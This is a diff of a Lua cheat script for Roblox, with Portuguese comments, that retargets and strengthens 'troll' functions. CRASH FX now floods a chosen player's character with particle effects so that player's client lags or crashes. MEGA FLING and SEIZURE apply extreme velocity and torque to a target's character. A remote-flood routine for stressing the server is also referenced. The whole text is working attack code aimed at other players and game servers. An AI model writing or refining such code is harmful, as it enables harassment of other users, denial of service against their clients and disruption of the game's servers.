@@ -555,6 +555,7 @@ headsitPlayer = function(player)
 
     myHum:SetStateEnabled(Enum.HumanoidStateType.Freefall, false)
     myHum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
+    myHum.Sit = true
 
     trollConnection = RunService.Heartbeat:Connect(function()
         if not player.Character or not player.Character:FindFirstChild("Head") then
@@ -563,10 +564,12 @@ headsitPlayer = function(player)
         end
         myChar = LP.Character
         myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
+        myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
         if not myHRP then return end
 
         head = player.Character:FindFirstChild("Head")
         myHRP.CFrame = head.CFrame * CFrame.new(0, 2, 0)
+        if myHum and not myHum.Sit then myHum.Sit = true end
     end)
     notify("Headsit: " .. player.DisplayName, "success")
 end
@@ -617,11 +620,28 @@ stopTroll = function()
             end)
         end
 
-        -- Cleanup crash FX (Fire, Smoke, ParticleEmitter, Sparkles)
+        -- Cleanup crash FX do meu char (Fire, Smoke, ParticleEmitter, Sparkles)
         pcall(function()
             for _, desc in pairs(char:GetDescendants()) do
                 if desc:IsA("Fire") or desc:IsA("Smoke") or desc:IsA("ParticleEmitter") or desc:IsA("Sparkles") then
                     pcall(function() desc:Destroy() end)
+                end
+            end
+        end)
+    end
+
+    -- Cleanup crash FX no target também
+    if trollTarget then
+        pcall(function()
+            local tc = trollTarget.Character
+            if tc then
+                for _, desc in pairs(tc:GetDescendants()) do
+                    if desc:IsA("Fire") or desc:IsA("Smoke") or desc:IsA("ParticleEmitter") or desc:IsA("Sparkles") then
+                        pcall(function() desc:Destroy() end)
+                    end
+                    if desc:IsA("BodyVelocity") or desc:IsA("BodyAngularVelocity") then
+                        pcall(function() desc:Destroy() end)
+                    end
                 end
             end
         end)
@@ -1229,18 +1249,18 @@ massFireRemotes = function()
 end
 
 --==================================================
--- CRASH TROLLS
+-- CRASH TROLLS — focados no TARGET, você fica safe
 --==================================================
 
--- CRASH FX — spam ParticleEmitter/Fire/Smoke/Sparkles no seu char
--- Todos os clients renderizam os efeitos = lag geral
-crashFxPlayer = function()
+-- CRASH FX — spam efeitos no CHARACTER DO TARGET
+-- O client dele tem que renderizar tudo = lag/crash nele, não em você
+crashFxPlayer = function(player)
     stopTroll()
-    local myChar = LP.Character
-    if not myChar then return end
+    local targetChar = player.Character
+    if not targetChar then notify("No character", "error") return end
 
     local parts = {}
-    for _, p in pairs(myChar:GetDescendants()) do
+    for _, p in pairs(targetChar:GetDescendants()) do
         if p:IsA("BasePart") then
             table.insert(parts, p)
         end
@@ -1249,8 +1269,14 @@ crashFxPlayer = function()
 
     trollConnection = task.spawn(function()
         while true do
+            -- Re-check target alive
+            targetChar = player.Character
+            if not targetChar then break end
+
             for _, part in ipairs(parts) do
                 pcall(function()
+                    if not part or not part.Parent then return end
+
                     local pe = Instance.new("ParticleEmitter")
                     pe.Rate = 500
                     pe.Lifetime = NumberRange.new(3, 8)
@@ -1277,10 +1303,11 @@ crashFxPlayer = function()
             task.wait(0.05)
         end
     end)
-    notify("CRASH FX ativo — laggando geral", "success")
+    notify("CRASH FX no " .. player.DisplayName .. " — ele vai lagar", "success")
 end
 
--- MEGA FLING — velocidade insana, manda o target pro espaço
+-- MEGA FLING — velocidade insana no target, múltiplos BodyVelocity + BodyAngularVelocity
+-- Manda pro espaço e buga o physics dele
 megaFlingPlayer = function(player)
     local targetChar = player.Character
     if not targetChar then notify("No character", "error") return end
@@ -1289,30 +1316,44 @@ megaFlingPlayer = function(player)
     local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
     if not targetHRP or not myHRP then return end
 
+    -- TP rápido pra perto, aplica forces, volta
     local savedCF = myHRP.CFrame
     myHRP.CFrame = targetHRP.CFrame * CFrame.new(0, 0, -1)
 
-    -- Múltiplos BodyVelocity em sequência rápida para crashar physics
     task.delay(0.1, function()
-        for i = 1, 5 do
-            task.delay(i * 0.05, function()
+        -- Spam de BodyVelocity em rajada
+        for i = 1, 8 do
+            task.delay(i * 0.03, function()
                 pcall(function()
                     local bv = Instance.new("BodyVelocity")
                     bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                     bv.Velocity = Vector3.new(
-                        math.random(-9999, 9999),
+                        math.random(-99999, 99999),
                         99999,
-                        math.random(-9999, 9999)
+                        math.random(-99999, 99999)
                     )
                     bv.Parent = targetHRP
-                    task.delay(0.3, function()
+
+                    -- Angular velocity pra girar loucamente
+                    local bav = Instance.new("BodyAngularVelocity")
+                    bav.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
+                    bav.AngularVelocity = Vector3.new(
+                        math.random(-999, 999),
+                        math.random(-999, 999),
+                        math.random(-999, 999)
+                    )
+                    bav.Parent = targetHRP
+
+                    task.delay(0.4, function()
                         pcall(function() bv:Destroy() end)
+                        pcall(function() bav:Destroy() end)
                     end)
                 end)
             end)
         end
 
-        task.delay(0.6, function()
+        -- Volta pra posição original
+        task.delay(0.5, function()
             if myHRP and myHRP.Parent then
                 myHRP.CFrame = savedCF
             end
@@ -1321,39 +1362,59 @@ megaFlingPlayer = function(player)
     notify("MEGA FLING: " .. player.DisplayName, "success")
 end
 
--- SEIZURE — TP rápido aleatório perto do alvo (visual glitch + physics stress)
+-- SEIZURE — spam BodyVelocity + BodyAngularVelocity aleatórios no TARGET
+-- Physics do target enlouquece, ele sai voando/girando sem parar
+-- Você fica parado safe
 seizurePlayer = function(player)
     stopTroll()
-    local myChar = LP.Character
-    local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
-    local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
-    if not myHRP or not myHum then return end
-
-    myHum:SetStateEnabled(Enum.HumanoidStateType.Freefall, false)
-    myHum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
+    local targetChar = player.Character
+    if not targetChar then notify("No character", "error") return end
+    local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
+    if not targetHRP then return end
 
     trollConnection = RunService.Heartbeat:Connect(function()
-        if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then
+        targetChar = player.Character
+        if not targetChar then
             stopTroll()
             return
         end
-        myChar = LP.Character
-        myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
-        if not myHRP then return end
+        targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
+        if not targetHRP then return end
 
-        local targetHRP = player.Character:FindFirstChild("HumanoidRootPart")
-        -- TP aleatório em volta = impossível de ver, physics enlouquece
-        myHRP.CFrame = targetHRP.CFrame * CFrame.new(
-            math.random(-40, 40),
-            math.random(-5, 25),
-            math.random(-40, 40)
-        ) * CFrame.Angles(
-            math.rad(math.random(0, 360)),
-            math.rad(math.random(0, 360)),
-            math.rad(math.random(0, 360))
-        )
+        -- Cada frame: cria BodyVelocity aleatório no target
+        pcall(function()
+            local bv = Instance.new("BodyVelocity")
+            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+            bv.Velocity = Vector3.new(
+                math.random(-500, 500),
+                math.random(-200, 500),
+                math.random(-500, 500)
+            )
+            bv.Parent = targetHRP
+            -- Auto-destroy rápido
+            task.delay(0.1, function()
+                pcall(function() bv:Destroy() end)
+            end)
+        end)
+
+        -- A cada ~5 frames, joga um angular velocity também
+        if math.random(1, 5) == 1 then
+            pcall(function()
+                local bav = Instance.new("BodyAngularVelocity")
+                bav.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
+                bav.AngularVelocity = Vector3.new(
+                    math.random(-200, 200),
+                    math.random(-200, 200),
+                    math.random(-200, 200)
+                )
+                bav.Parent = targetHRP
+                task.delay(0.15, function()
+                    pcall(function() bav:Destroy() end)
+                end)
+            end)
+        end
     end)
-    notify("SEIZURE: " .. player.DisplayName, "success")
+    notify("SEIZURE: " .. player.DisplayName .. " — physics dele bugou", "success")
 end
 
 -- REMOTE FLOOD — spam contínuo de todos os remotes (server stress)
